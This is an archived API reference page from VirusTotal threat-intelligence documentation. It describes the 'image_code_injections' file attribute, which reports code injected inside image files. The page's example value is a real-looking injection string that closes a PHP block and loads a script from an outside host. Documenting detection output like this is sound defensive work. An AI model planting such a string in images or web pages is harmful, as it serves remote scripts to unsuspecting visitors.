---
title: "image_code_injections"
source: https://gtidocs.virustotal.com/reference/file-object-image-code-injections
slug: file-object-image-code-injections
section: reference
group: "API OBJECTS"
updatedAt: 2025-09-25T00:41:11.000Z
retrieved: 2026-09-01
---

[gtidocs](../../../README.md) › [API Reference](../../README.md) › [API OBJECTS](../README.md) › [Files](../file-object.md) › image_code_injections

---

# image_code_injections

code injection inside image files.

`image_code_injections` returns content of code injection inside image files.

```json image code injection
{
  "data": {
		...
    "attributes" : {
      ...
      "image_code_injections": "<string>"
    }
  }
}
```
```json Example
{
    "data": {
        "attributes": {
            "image_code_injections": "?><script src=\"http://j56.gr/bin/s.js\"></script>"
        }
    }
}
```

---

← [elf_info](file-object-elf-info.md) · [up](../README.md) · [ipa_info](file-object-ipa-info.md) →

*Archived from <https://gtidocs.virustotal.com/reference/file-object-image-code-injections>.*
